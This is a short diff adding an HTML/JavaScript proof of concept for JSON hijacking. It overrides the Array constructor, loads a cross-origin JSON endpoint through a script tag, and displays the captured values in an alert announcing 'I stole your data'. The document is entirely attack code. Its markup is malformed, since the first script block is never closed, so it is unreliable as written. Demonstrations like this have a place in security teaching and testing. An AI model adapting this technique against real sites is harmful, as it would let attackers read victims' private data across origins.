@@ -1,0 +1,17 @@
+<script type="text/javascript">
+var secrets;
+
+Array = function() {
+  secrets = this;
+};
+<script type="text/javascript" src="[URL]"></script> //[URL] a GET request that returns [{"json":"code"}] in a form of an array
+<script type="text/javascript">
+
+  var yourData = '';
+  var i = -1;
+  while(secrets[++i]) {
+    yourData += secrets[i] + ' ';
+  }
+
+  alert('I stole your data: ' + yourData);
+</script>
